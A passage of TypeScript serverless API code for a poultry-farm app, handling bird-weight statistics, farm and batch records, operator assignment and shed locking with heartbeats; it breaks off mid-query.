            const uniformityPct = count > 0 ? Math.round((inRangeCount / count) * 1000) / 10 : 0;

            // CV% (Coefficient of variation: Standard Deviation / Mean * 100)
            let cv = 0;
            if (count > 1 && avg > 0) {
              const variance = weights.reduce((acc: number, val: number) => acc + Math.pow(val - avg, 2), 0) / (count - 1);
              const stdDev = Math.sqrt(variance);
              cv = Math.round((stdDev / avg) * 10000) / 100;
            }

            if (l.gender === 'FEMALE') {
              allFemaleWeights.push(...weights);
            } else {
              allMaleWeights.push(...weights);
            }

            linesBreakdown.push({
              lineId: l.id,
              lineName: l.line_name,
              shedName: l.shed_name,
              partName: l.part_name,
              gender: l.gender,
              stdWeight: std,
              birdCount: count,
              averageWeight: avg,
              uniformityPercent: uniformityPct,
              cvPercent: cv,
            });
          }

          const calcGroupStats = (weightsList: number[]) => {
            const count = weightsList.length;
            if (count === 0) return { count: 0, avg: 0, uniformity: 0 };
            const avg = Math.round((weightsList.reduce((a, b) => a + b, 0) / count) * 10) / 10;
            const inRange = weightsList.filter(w => w >= avg * 0.9 && w <= avg * 1.1).length;
            return {
              count,
              avg,
              uniformity: Math.round((inRange / count) * 1000) / 10,
            };
          };

          return jsonResponse({
            success: true,
            analytics: {
              totalBirds: allFemaleWeights.length + allMaleWeights.length,
              female: calcGroupStats(allFemaleWeights),
              male: calcGroupStats(allMaleWeights),
              linesBreakdown,
            },
          });
        }

        // -------------------------------------------------------------
        // E. FARMS REST ENDPOINTS: GET /api/farms, POST /api/farms
        // -------------------------------------------------------------
        if (path === '/farms' || path === '/farms/') {
          if (method === 'GET') {
            if (!env.DB) {
              return jsonResponse([]);
            }
            await ensureBatchesTable(env);
            const includeArchived = url.searchParams.get('includeArchived') === 'true';
            const farmsRes = includeArchived
              ? await env.DB.prepare('SELECT * FROM farms ORDER BY created_at DESC').all()
              : await env.DB.prepare('SELECT * FROM farms WHERE is_archived = 0 ORDER BY created_at DESC').all();

            const farms = ((farmsRes.results || []) as any[]).filter(f => workerCanAccessFarm(session, String(f.id), String(f.name || '')));
            const summaries: any[] = [];

            const allUsersRes = await env.DB.prepare('SELECT id, name, role, assigned_farms, assigned_farm_id FROM users').all().catch(() => ({ results: [] }));
            const allUsers = (allUsersRes.results || []) as any[];

            for (const f of farms) {
              const activeBatch = await ensureFarmActiveBatch(env, f);
              const shedCountRes = await env.DB.prepare('SELECT COUNT(*) as count FROM sheds WHERE farm_id = ?').bind(f.id).first() as any;
              const subCountRes = await env.DB.prepare('SELECT COUNT(*) as count FROM submissions WHERE farm_id = ?').bind(f.id).first() as any;

              const assignedUsers = allUsers.filter(u => {
                if (u.assigned_farm_id === f.id) return true;
                try {
                  const list = JSON.parse(u.assigned_farms || '[]');
                  return Array.isArray(list) && (list.includes(f.id) || list.includes(f.name));
                } catch {
                  return false;
                }
              });
              const assignedUserNames = assignedUsers.map(u => {
                const r = (u.role || '').toUpperCase();
                const display = (r === 'ADMIN' || r === 'MANAGER') ? 'Manager' : (r === 'INCHARGE' ? 'In-Charge' : 'Supervisor');
                return `${u.name} (${display})`;
              });

              summaries.push({
                id: f.id,
                name: f.name,
                location: f.location,
                flockDate: activeBatch?.startDate || f.flock_date || f.created_at,
                ageWeek: f.age_week || 'W1',
                season: f.season || 'Summer',
                updatedAt: f.updated_at || f.created_at,
                isArchived: Boolean(f.is_archived),
                activeBatch,
                startDate: activeBatch?.startDate || f.flock_date,
                startWeekNumber: activeBatch?.startWeekNumber || 1,
                assignedUserNames,
                _count: {
                  sheds: shedCountRes?.count || 0,
                  submissions: subCountRes?.count || 0,
                },
              });
            }

            return jsonResponse(summaries);
          }

          if (method === 'POST') {
            const body = await request.json().catch(() => ({})) as any;
            const farmId = `farm-${Date.now()}`;
            const farmName = (body.name || 'New Farm').trim();
            const season = body.season || 'Summer';
            const ageWeek = body.ageWeek || 'W1';
            const flockDate = body.flockDate || new Date().toISOString().split('T')[0];
            const shedCount = Math.min(Math.max(Number(body.shedCount) || 10, 1), 40);

            const createdSheds: any[] = [];
            const startWeekNum = parseInt(String(ageWeek || 'W1').replace(/\D/g, '') || '1', 10);
            const batchId = `batch-${farmId}-1`;

            if (env.DB) {
              await ensureBatchesTable(env);
              await env.DB.prepare(
                'INSERT INTO farms (id, name, season, age_week, flock_date) VALUES (?, ?, ?, ?, ?)'
              ).bind(farmId, farmName, season, ageWeek, flockDate).run();

              // Automatically initialize default Batch 1 for the new farm
              await env.DB.prepare(`
                INSERT INTO batches (id, farm_id, batch_name, start_date, start_week_number, status)
                VALUES (?, ?, 'Batch 1', ?, ?, 'ACTIVE')
              `).bind(batchId, farmId, flockDate, startWeekNum).run().catch(() => {});
            }

            // Pre-create sheds, parts, and lines with Line-level Gender and empty weights
            for (let sIdx = 1; sIdx <= shedCount; sIdx++) {
              const shedId = `shed-${farmId}-${sIdx}`;
              const shedName = `Shed ${sIdx}`;
              if (env.DB) {
                await env.DB.prepare(
                  'INSERT INTO sheds (id, farm_id, name) VALUES (?, ?, ?)'
                ).bind(shedId, farmId, shedName).run().catch(() => {});
              }

              const partsList: any[] = [];
              // 2 Parts per shed
              for (let pIdx = 1; pIdx <= 2; pIdx++) {
                const partId = `part-${shedId}-${pIdx}`;
                const partName = pIdx === 1 ? 'Part 1' : 'Part 2';
                if (env.DB) {
                  await env.DB.prepare(
                    'INSERT INTO parts (id, shed_id, name) VALUES (?, ?, ?)'
                  ).bind(partId, shedId, partName).run().catch(() => {});
                }

                const linesList: any[] = [];
                // 5 Lines per part
                for (let lIdx = 1; lIdx <= 5; lIdx++) {
                  const lineId = `line-${partId}-${lIdx}`;
                  // Default to FEMALE for main grower lines, MALE for line 5
                  const gender = (sIdx === shedCount || lIdx === 5) ? 'MALE' : 'FEMALE';
                  const std = gender === 'MALE' ? 150 : 140;

                  if (env.DB) {
                    await env.DB.prepare(
                      'INSERT INTO lines (id, part_id, line_number, name, gender, std_weight_grams) VALUES (?, ?, ?, ?, ?, ?)'
                    ).bind(lineId, partId, lIdx, `Line ${lIdx}`, gender, std).run().catch(() => {});
                  }

                  linesList.push({
                    id: lineId,
                    name: `Line ${lIdx}`,
                    lineNumber: lIdx,
                    gender,
                    stdWeight: std,
                    targetBirdCount: 0,
                    weights: [],
                  });
                }

                partsList.push({
                  id: partId,
                  name: partName,
                  lines: linesList,
                });
              }

              createdSheds.push({
                id: shedId,
                farmId,
                name: shedName,
                type: sIdx === shedCount ? 'Male' : 'Female',
                targetBirdCount: 0,
                locked: false,
                lockedByUserId: null,
                lockedByUserName: null,
                lockedAt: null,
                lastHeartbeatAt: null,
                recordedByUserId: null,
                recordedByUserName: null,
                birdCount: 0,
                weights: [],
                status: 'PENDING',
                savedStatus: 'PENDING',
                totalBirdCount: 0,
                parts: partsList,
              });
            }

            return jsonResponse({
              id: farmId,
              name: farmName,
              season,
              ageWeek,
              flockDate,
              shedCount,
              sheds: createdSheds,
              activeBatch: {
                id: batchId,
                farmId,
                batchName: 'Batch 1',
                startDate: flockDate,
                startWeekNumber: startWeekNum,
                status: 'ACTIVE',
              },
            }, 201);
          }
        }

        // -------------------------------------------------------------
        // E2. BATCHES REST ENDPOINTS: GET & POST /api/farms/:id/batches
        // -------------------------------------------------------------
        const farmBatchesMatch = path.match(/^\/farms\/([^/]+)\/batches$/);
        if (farmBatchesMatch) {
          const farmId = decodeURIComponent(farmBatchesMatch[1]);
          if (method === 'GET') {
            if (!env.DB) return jsonResponse({ success: true, batches: [] });
            await ensureBatchesTable(env);
            const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
            if (!farm) return errorResponse('Farm not found', 404);

            await ensureFarmActiveBatch(env, farm);
            const batchesRes = await env.DB.prepare(
              'SELECT * FROM batches WHERE farm_id = ? ORDER BY created_at DESC'
            ).bind(farmId).all();

            const batches = (batchesRes.results || []).map((b: any) => ({
              id: b.id,
              farmId: b.farm_id,
              batchName: b.batch_name,
              startDate: b.start_date,
              startWeekNumber: b.start_week_number,
              status: b.status,
              createdAt: b.created_at,
              updatedAt: b.updated_at,
            }));

            return jsonResponse({ success: true, batches });
          }

          if (method === 'POST') {
            if (!env.DB) return jsonResponse({ success: true, message: 'D1 not bound' });
            await ensureBatchesTable(env);
            const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
            if (!farm) return errorResponse('Farm not found', 404);

            const body = await request.json().catch(() => ({})) as any;

            // 1. Mark existing batches as COMPLETED (read-only)
            await env.DB.prepare(
              'UPDATE batches SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE farm_id = ?'
            ).bind('COMPLETED', farmId).run();

            // 2. Determine new batch name
            const countRes = await env.DB.prepare(
              'SELECT COUNT(*) as count FROM batches WHERE farm_id = ?'
            ).bind(farmId).first() as any;
            const count = (countRes?.count || 0) + 1;
            const batchName = (body.batchName || `Batch ${count}`).trim();
            const startDate = body.startDate || new Date().toISOString().split('T')[0];
            const startWeekNumber = Number(body.startWeekNumber) || 1;
            const batchId = `batch-${farmId}-${Date.now()}`;

            // 3. Create new ACTIVE batch
            await env.DB.prepare(`
              INSERT INTO batches (id, farm_id, batch_name, start_date, start_week_number, status)
              VALUES (?, ?, ?, ?, ?, 'ACTIVE')
            `).bind(batchId, farmId, batchName, startDate, startWeekNumber).run();

            // 4. Release any active locks so new batch starts fresh
            await env.DB.prepare(`
              UPDATE sheds SET
                locked_by_user_id = NULL,
                locked_by_user_name = NULL,
                locked_at = NULL,
                last_heartbeat_at = NULL
              WHERE farm_id = ?
            `).bind(farmId).run().catch(() => {});

            const newBatch = {
              id: batchId,
              farmId,
              batchName,
              startDate,
              startWeekNumber,
              status: 'ACTIVE',
            };

            return jsonResponse({
              success: true,
              batch: newBatch,
              message: `Started ${batchName} successfully for farm ${farm.name}.`,
            }, 201);
          }
        }

        // GET /api/farms/:id
        const singleFarmMatch = path.match(/^\/farms\/([^/]+)$/);
        if (singleFarmMatch) {
          const farmId = decodeURIComponent(singleFarmMatch[1]);
          if (method === 'GET') {
            if (!env.DB) {
              return jsonResponse({ id: farmId, name: 'Active Farm', sheds: [] });
            }

            await ensureShedWeekStatusTable(env);
            await ensureBatchesTable(env);

            const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
            if (!farm) return errorResponse('Farm not found', 404);

            const activeBatch = await ensureFarmActiveBatch(env, farm);
            const requestedBatchId = url.searchParams.get('batchId');
            const targetBatchId = requestedBatchId || activeBatch?.id;

            // Fetch all batches for this farm
            const allBatchesRes = await env.DB.prepare(
              'SELECT * FROM batches WHERE farm_id = ? ORDER BY created_at DESC'
            ).bind(farmId).all().catch(() => ({ results: [] }));
            const batchesList = (allBatchesRes.results || []).map((b: any) => ({
              id: b.id,
              farmId: b.farm_id,
              batchName: b.batch_name,
              startDate: b.start_date,
              startWeekNumber: b.start_week_number,
              status: b.status,
            }));

            // Check if selected batch is the initial/first batch for legacy backward compatibility
            const firstBatch = batchesList.length > 0 ? batchesList[batchesList.length - 1] : null;
            const isInitialBatch = Boolean(firstBatch && firstBatch.id === targetBatchId);

            const targetWeek = (url.searchParams.get('week') || farm.age_week || 'W18').toUpperCase();

            // Check if submission exists for this specific week and batch
            const subForWeek = isInitialBatch
              ? await env.DB.prepare(
                  'SELECT * FROM submissions WHERE farm_id = ? AND UPPER(flock_age) = ? AND (batch_id = ? OR batch_id IS NULL) ORDER BY created_at DESC LIMIT 1'
                ).bind(farmId, targetWeek, targetBatchId).first() as any
              : await env.DB.prepare(
                  'SELECT * FROM submissions WHERE farm_id = ? AND UPPER(flock_age) = ? AND batch_id = ? ORDER BY created_at DESC LIMIT 1'
                ).bind(farmId, targetWeek, targetBatchId).first() as any;

            // Fetch shed saves for this week and batch from shed_week_status
            const shedWeekStatuses = isInitialBatch
              ? await env.DB.prepare(
                  'SELECT * FROM shed_week_status WHERE farm_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL)'
                ).bind(farmId, targetWeek, targetBatchId).all().catch(() => ({ results: [] }))
              : await env.DB.prepare(
                  'SELECT * FROM shed_week_status WHERE farm_id = ? AND UPPER(week) = ? AND batch_id = ?'
                ).bind(farmId, targetWeek, targetBatchId).all().catch(() => ({ results: [] }));
            const swsMap = new Map((shedWeekStatuses.results || []).map((s: any) => [s.shed_id, s]));

            const shedsRes = await env.DB.prepare('SELECT * FROM sheds WHERE farm_id = ?').bind(farmId).all();
            const sheds: any[] = [];
            let totalFarmBirds = 0;
            let savedShedsCount = 0;

            for (const s of shedsRes.results || []) {
              const partsRes = await env.DB.prepare('SELECT * FROM parts WHERE shed_id = ?').bind(s.id).all();
              const parts: any[] = [];
              let shedBirdCount = 0;

              for (const p of partsRes.results || []) {
                const linesRes = await env.DB.prepare('SELECT * FROM lines WHERE part_id = ? ORDER BY line_number ASC').bind(p.id).all();
                const lines: any[] = [];

                for (const l of linesRes.results || []) {
                  // Strictly filter weights by line_id, targetWeek AND batch
                  const weightsRes = isInitialBatch
                    ? await env.DB.prepare(
                        'SELECT weight_grams FROM bird_weights WHERE line_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL) ORDER BY entry_index ASC'
                      ).bind(l.id, targetWeek, targetBatchId).all()
                    : await env.DB.prepare(
                        'SELECT weight_grams FROM bird_weights WHERE line_id = ? AND UPPER(week) = ? AND batch_id = ? ORDER BY entry_index ASC'
                      ).bind(l.id, targetWeek, targetBatchId).all();

                  const weights = (weightsRes.results || []).map((w: any) => w.weight_grams);
                  shedBirdCount += weights.length;

                  lines.push({
                    id: l.id,
                    name: l.name,
                    gender: l.gender,
                    weights,
                  });
                }

                parts.push({
                  id: p.id,
                  name: p.name,
                  lines,
                });
              }

              totalFarmBirds += shedBirdCount;
              const sws: any = swsMap.get(s.id);
              const isSaved = sws?.status === 'SAVED';
              if (isSaved) savedShedsCount++;

              const last = s.last_heartbeat_at ? new Date(s.last_heartbeat_at).getTime() : 0;
              const isLocked = Boolean(s.locked_by_user_id && last && (Date.now() - last <= 120_000) && (!s.locked_week || s.locked_week.toUpperCase() === targetWeek.toUpperCase()));

              sheds.push({
                id: s.id,
                name: s.name,
                locked: isLocked,
                lockedByUserId: isLocked ? s.locked_by_user_id : null,
                lockedByUserName: isLocked ? s.locked_by_user_name : null,
                lockedAt: isLocked ? s.locked_at : null,
                lastHeartbeatAt: isLocked ? s.last_heartbeat_at : null,
                // Stage 2: Team Visibility attributes strictly scoped to targetWeek
                savedStatus: isSaved ? 'SAVED' : (shedBirdCount > 0 ? 'DRAFT' : 'PENDING'),
                savedByUserId: isSaved ? (sws?.saved_by_user_id || null) : null,
                savedByUserName: isSaved ? (sws?.saved_by_user_name || null) : null,
                totalBirdCount: isSaved ? (sws?.total_bird_count || 0) : shedBirdCount,
                savedAt: isSaved ? (sws?.saved_at || null) : null,
                parts,
              });
            }

            const totalShedsCount = sheds.length;
            const allShedsSaved = totalShedsCount > 0 && savedShedsCount >= totalShedsCount;
            const selectedBatch = batchesList.find(b => b.id === targetBatchId) || activeBatch;

            // Fetch assigned user names for this farm
            const farmUsersRes = await env.DB.prepare('SELECT id, name, role, assigned_farms, assigned_farm_id FROM users').all().catch(() => ({ results: [] }));
            const farmAssignedUsers = ((farmUsersRes.results || []) as any[]).filter(u => {
              if (u.assigned_farm_id === farmId) return true;
              try {
                const list = JSON.parse(u.assigned_farms || '[]');
                return Array.isArray(list) && (list.includes(farmId) || list.includes(farm.name));
              } catch {
                return false;
              }
            });
            const assignedUserNames = farmAssignedUsers.map(u => {
              const r = (u.role || '').toUpperCase();
              const display = (r === 'ADMIN' || r === 'MANAGER') ? 'Manager' : (r === 'INCHARGE' ? 'In-Charge' : 'Supervisor');
              return `${u.name} (${display})`;
            });

            return jsonResponse({
              ...farm,
              ageWeek: targetWeek,
              activeBatch,
              batches: batchesList,
              currentBatch: selectedBatch,
              startDate: selectedBatch?.startDate || farm.flock_date,
              startWeekNumber: selectedBatch?.startWeekNumber || 1,
              status: subForWeek ? 'COMPLETED' : 'DRAFT',
              assignedUserNames,
              audit: subForWeek ? {
                status: 'COMPLETED',
                lastSubmittedAt: subForWeek.created_at,
                lastSubmittedBy: subForWeek.submitted_by,
                lastSubmittedRole: subForWeek.submitted_role,
                submittedBy: subForWeek.submitted_by,
                submittedRole: subForWeek.submitted_role,
                totalBirdsSubmitted: subForWeek.total_birds,
                batchId: subForWeek.batch_id,
                batchName: subForWeek.batch_name,
              } : null,
              farmProgress: {
                totalShedsCount,
                savedShedsCount,
                totalFarmBirds,
                allShedsSaved,
                progressPercent: totalShedsCount > 0 ? Math.round((savedShedsCount / totalShedsCount) * 100) : 0,
              },
              allShedsSaved,
              sheds,
            });
          }

          if (method === 'DELETE') {
            if (env.DB) {
              await env.DB.prepare('UPDATE farms SET is_archived = 1 WHERE id = ?').bind(farmId).run();
            }
            return jsonResponse({ success: true, message: 'Farm archived' });
          }
        }

        // POST /api/farms/:id/assign-operators - Assign Field Operators to Farm
        const farmAssignOperatorsMatch = path.match(/^\/farms\/([^/]+)\/assign-operators$/);
        if (farmAssignOperatorsMatch && method === 'POST') {
          const farmId = decodeURIComponent(farmAssignOperatorsMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const operatorUserIds: string[] = body.operatorUserIds || body.operatorIds || [];

          if (!Array.isArray(operatorUserIds)) {
            return errorResponse('operatorUserIds must be an array of user IDs', 400);
          }

          if (!env.DB) {
            return jsonResponse({
              success: true,
              farmId,
              assignedUserNames: [],
              count: 0,
            });
          }

          await ensureUsersTable(env);
          const farm = await env.DB.prepare('SELECT id, name FROM farms WHERE id = ?').bind(farmId).first() as any;
          if (!farm) {
            return errorResponse('Farm not found in database', 404);
          }

          // Query all users to update their farm assignments
          const allUsersRes = await env.DB.prepare(
            'SELECT id, name, role, assigned_farms, assigned_farm_id FROM users'
          ).all().catch(() => ({ results: [] }));
          const allUsers = (allUsersRes.results || []) as any[];

          const updatedAssignedUserNames: string[] = [];

          for (const user of allUsers) {
            const isManagerOrAdmin = (user.role || '').toUpperCase() === 'ADMIN' || (user.role || '').toUpperCase() === 'MANAGER';
            // Only update assignments for field operators or explicit target users
            const isTarget = operatorUserIds.includes(user.id);

            // Skip modifying Admin/Manager assignedFarms unless explicitly targeted
            if (isManagerOrAdmin && !isTarget) {
              continue;
            }

            const currentSet = new Set<string>();
            if (user.assigned_farms) {
              try {
                const parsed = JSON.parse(user.assigned_farms);
                if (Array.isArray(parsed)) {
                  parsed.forEach((item: string) => {
                    if (item && item !== '*') currentSet.add(item);
                  });
                }
              } catch {}
            }

            let newAssignedFarmId = user.assigned_farm_id;

            if (isTarget) {
              currentSet.add(farm.id);
              currentSet.add(farm.name);
              newAssignedFarmId = farm.id;
              const r = (user.role || '').toUpperCase();
              const displayRole = (r === 'ADMIN' || r === 'MANAGER') ? 'Manager' : (r === 'INCHARGE' ? 'In-Charge' : 'Supervisor');
              updatedAssignedUserNames.push(`${user.name} (${displayRole})`);
            } else {
              currentSet.delete(farm.id);
              currentSet.delete(farm.name);
              if (newAssignedFarmId === farm.id) {
                const remaining = Array.from(currentSet).filter(id => id.startsWith('farm-'));
                newAssignedFarmId = remaining.length > 0 ? remaining[0] : null;
              }
            }

            const newAssignedFarmsJson = JSON.stringify(Array.from(currentSet));
            await env.DB.prepare(
              'UPDATE users SET assigned_farm_id = ?, assigned_farms = ? WHERE id = ?'
            ).bind(newAssignedFarmId, newAssignedFarmsJson, user.id).run().catch(() => {});
          }

          return jsonResponse({
            success: true,
            farmId,
            assignedUserNames: updatedAssignedUserNames,
            count: updatedAssignedUserNames.length,
          });
        }

        // PUT /api/farms/:id/details
        const farmDetailsMatch = path.match(/^\/farms\/([^/]+)\/details$/);
        if (farmDetailsMatch && method === 'PUT') {
          const farmId = decodeURIComponent(farmDetailsMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          if (env.DB && body.name) {
            await env.DB.prepare('UPDATE farms SET name = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?').bind(body.name, farmId).run();
          }
          return jsonResponse({ success: true, message: 'Farm details updated' });
        }

        // PUT /api/farms/:id/sync
        const farmSyncMatch = path.match(/^\/farms\/([^/]+)\/sync$/);
        if (farmSyncMatch && method === 'PUT') {
          const farmId = decodeURIComponent(farmSyncMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          if (env.DB && body.sheds && Array.isArray(body.sheds)) {
            // Save state / sync lines
            for (const s of body.sheds) {
              for (const p of s.parts || []) {
                for (const l of p.lines || []) {
                  if (l.gender) {
                    await env.DB.prepare('UPDATE lines SET gender = ? WHERE id = ?').bind(l.gender.toUpperCase(), l.id).run().catch(() => {});
                  }
                }
              }
            }
          }
          return jsonResponse({ success: true, farmId });
        }

        // -------------------------------------------------------------
        // SHED CONCURRENCY LOCKING & OPERATOR ATTRIBUTION (LIVE-STATE)
        // -------------------------------------------------------------
        const liveStateFarmMatch = path.match(/^\/farms\/([^/]+)\/(?:shed-locks|live-state)$/);
        if (path === '/sheds/locks' || liveStateFarmMatch) {
          if (method === 'GET') {
            const farmIdParam = liveStateFarmMatch ? decodeURIComponent(liveStateFarmMatch[1]) : url.searchParams.get('farmId');
            const targetWeek = (url.searchParams.get('week') || 'W18').toUpperCase();
            const locks: Record<string, any> = {};
            let totalShedsCount = 0;
            let savedShedsCount = 0;
            let totalFarmBirdsCount = 0;

            if (env.DB) {
              await ensureShedWeekStatusTable(env);
              await ensureShedLockColumns(env);

              const allShedsRes = farmIdParam
                ? await env.DB.prepare('SELECT id, farm_id, name, locked_by_user_id, locked_by_user_name, locked_at, last_heartbeat_at, locked_week, locked_batch_id, recorded_by_user_id, recorded_by_user_name FROM sheds WHERE farm_id = ?').bind(farmIdParam).all().catch(() => ({ results: [] }))
                : await env.DB.prepare('SELECT id, farm_id, name, locked_by_user_id, locked_by_user_name, locked_at, last_heartbeat_at, locked_week, locked_batch_id, recorded_by_user_id, recorded_by_user_name FROM sheds').all().catch(() => ({ results: [] }));

              // Query shed saves for this week
              const swsRes = farmIdParam
                ? await env.DB.prepare('SELECT * FROM shed_week_status WHERE farm_id = ? AND UPPER(week) = ?').bind(farmIdParam, targetWeek).all().catch(() => ({ results: [] }))
                : await env.DB.prepare('SELECT * FROM shed_week_status WHERE UPPER(week) = ?').bind(targetWeek).all().catch(() => ({ results: [] }));
              
              const swsMap = new Map((swsRes.results || []).map((row: any) => [row.shed_id, row]));
              const shedsList = allShedsRes.results || [];
              totalShedsCount = shedsList.length;

              for (const s of shedsList) {
                const last = s.last_heartbeat_at ? new Date(s.last_heartbeat_at).getTime() : 0;
                const isLocked = Boolean(
                  s.locked_by_user_id &&
                  last &&
                  (Date.now() - last <= 120_000) &&
                  (!s.locked_week || s.locked_week.toUpperCase() === targetWeek)
                );
                const sws: any = swsMap.get(s.id);
                const isSaved = sws?.status === 'SAVED';
                if (isSaved) savedShedsCount++;

                const birdsInShed = sws?.total_bird_count || 0;
                totalFarmBirdsCount += birdsInShed;

                locks[s.id] = {
                  shedId: s.id,
                  shedName: s.name,
                  farmId: s.farm_id,
                  locked: isLocked,
                  lockedByUserId: isLocked ? s.locked_by_user_id : null,
                  lockedByUserName: isLocked ? s.locked_by_user_name : null,
                  lockedAt: isLocked ? s.locked_at : null,
                  lastHeartbeatAt: isLocked ? s.last_heartbeat_at : null,
                  // Stage 2: Team Visibility attributes strictly scoped to targetWeek
                  savedStatus: isSaved ? 'SAVED' : (birdsInShed > 0 ? 'DRAFT' : 'PENDING'),
                  savedByUserId: isSaved ? (sws?.saved_by_user_id || null) : null,
                  savedByUserName: isSaved ? (sws?.saved_by_user_name || null) : null,
                  totalBirdCount: birdsInShed,
                  savedAt: isSaved ? (sws?.saved_at || null) : null,
                  weights: sws?.weights_json ? (() => { try { return JSON.parse(sws.weights_json); } catch { return null; } })() : null,
                };
              }
            }

            const allShedsSaved = totalShedsCount > 0 && savedShedsCount >= totalShedsCount;
            return jsonResponse({
              locks,
              farmProgress: {
                totalShedsCount,
                savedShedsCount,
                totalFarmBirdsCount,
                allShedsSaved,
                progressPercent: totalShedsCount > 0 ? Math.round((savedShedsCount / totalShedsCount) * 100) : 0,
              },
              allShedsSaved,
              week: targetWeek,
              farmId: farmIdParam,
            });
          }
        }

        // -------------------------------------------------------------
        // PERMANENT SHED LOCK: BLOCK POST-CREATION RENAME & DELETE
        // -------------------------------------------------------------
        const singleShedMatch = path.match(/^\/sheds\/([^/]+)$/);
        if (singleShedMatch && (method === 'DELETE' || method === 'PUT' || method === 'PATCH')) {
          return errorResponse('Sheds are permanently locked at farm creation and cannot be renamed or deleted.', 403);
        }

        // POST /api/sheds/:shedId/enter
        const shedEnterMatch = path.match(/^\/sheds\/([^/]+)\/enter$/);
        if (shedEnterMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedEnterMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const userId = body.userId || body.lockedByUserId || request.headers.get('x-user-id');
          const userName = body.userName || body.lockedByUserName || request.headers.get('x-user-username') || 'Incharge';
          const targetWeek = (body.week || request.headers.get('x-week') || '').toUpperCase() || null;
          const targetBatchId = body.batchId || null;

          if (!userId) {
            return errorResponse('Authentication required. Please log in.', 401);
          }

          if (env.DB) {
            await ensureShedLockColumns(env);
            const shed = await env.DB.prepare('SELECT * FROM sheds WHERE id = ?').bind(shedId).first() as any;
            if (!shed) return errorResponse('Shed not found', 404);

            const last = shed.last_heartbeat_at ? new Date(shed.last_heartbeat_at).getTime() : 0;
            const isLocked = Boolean(
              shed.locked_by_user_id &&
              last &&
              (Date.now() - last <= 120_000) &&
              (!shed.locked_week || !targetWeek || shed.locked_week.toUpperCase() === targetWeek)
            );

            if (shed.locked_by_user_id && shed.locked_by_user_id !== userId && isLocked) {
              return new Response(JSON.stringify({
                locked: true,
                lockedByUserId: shed.locked_by_user_id,
                lockedByUserName: shed.locked_by_user_name || 'Another Incharge',
                message: `⚠️ ${shed.name} is currently being weighed by ${shed.locked_by_user_name || 'another Incharge'}. Only one Incharge can enter a shed at a time.`
              }), {
                status: 409,
                headers: { 'Content-Type': 'application/json', ...CORS_HEADERS, ...NO_CACHE_HEADERS }
              });
            }

            const nowIso = new Date().toISOString();
            await env.DB.prepare(`
              UPDATE sheds SET 
                locked_by_user_id = ?, 
                locked_by_user_name = ?, 
                locked_at = ?, 
                last_heartbeat_at = ?,
                locked_week = ?,
                locked_batch_id = ?
              WHERE id = ?
            `).bind(userId, userName, nowIso, nowIso, targetWeek, targetBatchId, shedId).run().catch(() => {});

            await env.DB.prepare('UPDATE farms SET updated_at = CURRENT_TIMESTAMP WHERE id = ?').bind(shed.farm_id).run().catch(() => {});

            return jsonResponse({
              success: true,
              locked: true,
              shedId,
              shedName: shed.name,
              lockedByUserId: userId,
              lockedByUserName: userName,
              lockedAt: nowIso,
              lastHeartbeatAt: nowIso,
              week: targetWeek,
            });
          }

          return jsonResponse({ success: true, locked: true, shedId, lockedByUserId: userId, lockedByUserName: userName });
        }

        // POST /api/sheds/:shedId/heartbeat
        const shedHeartbeatMatch = path.match(/^\/sheds\/([^/]+)\/heartbeat$/);
        if (shedHeartbeatMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedHeartbeatMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const userId = body.userId || body.lockedByUserId || request.headers.get('x-user-id');
          const targetWeek = (body.week || request.headers.get('x-week') || '').toUpperCase() || null;
          const nowIso = new Date().toISOString();

          if (env.DB) {
            const shed = await env.DB.prepare('SELECT * FROM sheds WHERE id = ?').bind(shedId).first() as any;
            if (!shed) return errorResponse('Shed not found', 404);

            const last = shed.last_heartbeat_at ? new Date(shed.last_heartbeat_at).getTime() : 0;
            const isLocked = Boolean(
              shed.locked_by_user_id &&
              last &&
              (Date.now() - last <= 120_000) &&
              (!shed.locked_week || !targetWeek || shed.locked_week.toUpperCase() === targetWeek)
            );

            if (userId && shed.locked_by_user_id && shed.locked_by_user_id !== userId && isLocked) {
              return new Response(JSON.stringify({
                locked: true,
                lockedByUserId: shed.locked_by_user_id,
                lockedByUserName: shed.locked_by_user_name,
                message: `⚠️ ${shed.name} is currently being weighed by ${shed.locked_by_user_name || 'another Incharge'}. Only one Incharge can enter a shed at a time.`
              }), {
                status: 409,
                headers: { 'Content-Type': 'application/json', ...CORS_HEADERS, ...NO_CACHE_HEADERS }
              });
            }

            await env.DB.prepare('UPDATE sheds SET last_heartbeat_at = ? WHERE id = ?').bind(nowIso, shedId).run().catch(() => {});
          }

          return jsonResponse({ success: true, shedId, lastHeartbeatAt: nowIso });
        }

        // POST /api/sheds/:shedId/leave
        const shedLeaveMatch = path.match(/^\/sheds\/([^/]+)\/leave$/);
        if (shedLeaveMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedLeaveMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const recordedByUserId = body.recordedByUserId || body.userId;
          const recordedByUserName = body.recordedByUserName || body.userName;

          if (env.DB) {
            await env.DB.prepare(`
              UPDATE sheds SET 
                locked_by_user_id = NULL, 
                locked_by_user_name = NULL, 
                locked_at = NULL, 
                last_heartbeat_at = NULL,
                locked_week = NULL,
                locked_batch_id = NULL
              WHERE id = ?
            `).bind(shedId).run().catch(() => {});
          }

          return jsonResponse({ success: true, shedId, locked: false, recordedByUserId, recordedByUserName });
        }

        // POST /api/sheds/:shedId/force-unlock
        const shedForceUnlockMatch = path.match(/^\/sheds\/([^/]+)\/force-unlock$/);
        if (shedForceUnlockMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedForceUnlockMatch[1]);
          if (env.DB) {
            await env.DB.prepare(`
              UPDATE sheds SET 
                locked_by_user_id = NULL, 
                locked_by_user_name = NULL, 
                locked_at = NULL, 
                last_heartbeat_at = NULL,
                locked_week = NULL,
